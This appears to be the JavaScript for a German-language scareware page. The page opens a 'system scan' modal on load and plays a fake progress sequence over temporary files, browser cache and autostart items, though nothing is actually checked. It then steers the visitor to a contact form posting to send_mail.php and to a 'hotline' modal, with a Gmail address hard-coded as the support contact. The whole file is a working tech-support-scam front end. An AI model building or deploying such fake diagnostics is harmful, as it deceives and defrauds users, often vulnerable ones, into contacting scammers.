const supportEmail = "herr.heuer2233@gmail.com";
const scanSteps = [
  "Temporäre Dateien werden überprüft...",
  "Browser-Cache wird überprüft...",
  "Autostart-Elemente werden überprüft...",
  "Systembereinigungsstatus wird überprüft..."
];

const scanModal = new bootstrap.Modal(document.getElementById("scanModal"));
const progressModal = new bootstrap.Modal(document.getElementById("progressModal"));
const resultModal = new bootstrap.Modal(document.getElementById("resultModal"));
const hotlineModal = new bootstrap.Modal(document.getElementById("hotlineModal"));

const scanButton = document.getElementById("scanButton");
const progressBar = document.getElementById("scanProgress");
const progressElement = document.querySelector(".progress");
const scanStatus = document.getElementById("scanStatus");
const scanStepItems = document.querySelectorAll(".scan-step");
const contactForm = document.getElementById("contactForm");

window.addEventListener("load", () => {
  const dateEl = document.getElementById("currentDateTime");
  if (dateEl) {
    const now = new Date();
    const dateStr = `${now.getDate().toString().padStart(2, '0')}.${(now.getMonth() + 1).toString().padStart(2, '0')}.${now.getFullYear()}`;
    const timeStr = now.toLocaleTimeString("de-DE");
    dateEl.textContent = `${dateStr}, ${timeStr}`;
  }
  scanModal.show();
});

scanButton.addEventListener("click", () => {
  scanModal.hide();
  progressBar.style.width = "0%";
  progressBar.textContent = "0%";
  progressElement.setAttribute("aria-valuenow", "0");
  scanStatus.textContent = scanSteps[0];
  resetScanSteps();
  progressModal.show();

  runScanStep(0);
});

function resetScanSteps() {
  scanStepItems.forEach((item) => {
    item.classList.remove("is-active", "is-complete");
    item.querySelector("i").className = "bi bi-hourglass-split";
  });
}

function setProgress(value) {
  progressBar.style.width = `${value}%`;
  progressBar.textContent = `${value}%`;
  progressElement.setAttribute("aria-valuenow", String(value));
}

function runScanStep(index) {
  if (index >= scanSteps.length) {
    scanStatus.textContent = "Kontaktoptionen werden vorbereitet...";
    setProgress(100);
    window.setTimeout(() => {
      progressModal.hide();
      resultModal.show();
    }, 650);
    return;
  }

  const stepItem = scanStepItems[index];
  const stepStart = Math.round((index / scanSteps.length) * 100);
  const stepEnd = Math.round(((index + 1) / scanSteps.length) * 100);
  let currentProgress = stepStart;

  scanStatus.textContent = scanSteps[index];
  stepItem.classList.add("is-active");
  stepItem.querySelector("i").className = "bi bi-arrow-repeat";
  setProgress(currentProgress);

  const timer = window.setInterval(() => {
    currentProgress += 5;
    setProgress(Math.min(currentProgress, stepEnd));

    if (currentProgress >= stepEnd) {
      window.clearInterval(timer);
      stepItem.classList.remove("is-active");
      stepItem.classList.add("is-complete");
      stepItem.querySelector("i").className = "bi bi-check-circle-fill";
      window.setTimeout(() => runScanStep(index + 1), 260);
    }
  }, 140);
}

contactForm.addEventListener("submit", (event) => {
  event.preventDefault();

  const submitBtn = contactForm.querySelector('button[type="submit"]');
  const originalBtnText = submitBtn.innerHTML;
  let statusEl = contactForm.querySelector(".form-status");

  if (!statusEl) {
    statusEl = document.createElement("div");
    statusEl.className = "form-status mt-2";
    contactForm.appendChild(statusEl);
  }

  // Loading state
  submitBtn.disabled = true;
  submitBtn.innerHTML = '<i class="bi bi-arrow-repeat me-2 spin-icon"></i>Wird gesendet...';
  statusEl.textContent = "";
  statusEl.className = "form-status mt-2";

  const formData = new FormData(contactForm);

  fetch("send_mail.php", {
    method: "POST",
    body: formData
  })
    .then((res) => res.json().then((data) => ({ ok: res.ok, data })))
    .then(({ ok, data }) => {
      if (ok && data.success) {
        contactForm.reset();
        resultModal.hide();
        hotlineModal.show();
      } else {
        statusEl.textContent = data.message || "Senden fehlgeschlagen. Bitte versuchen Sie es erneut.";
        statusEl.classList.add("text-danger", "fw-semibold");
      }
    })
    .catch(() => {
      statusEl.textContent = "Netzwerkfehler. Bitte versuchen Sie es erneut.";
      statusEl.classList.add("text-danger", "fw-semibold");
    })
    .finally(() => {
      submitBtn.disabled = false;
      submitBtn.innerHTML = originalBtnText;
    });
});
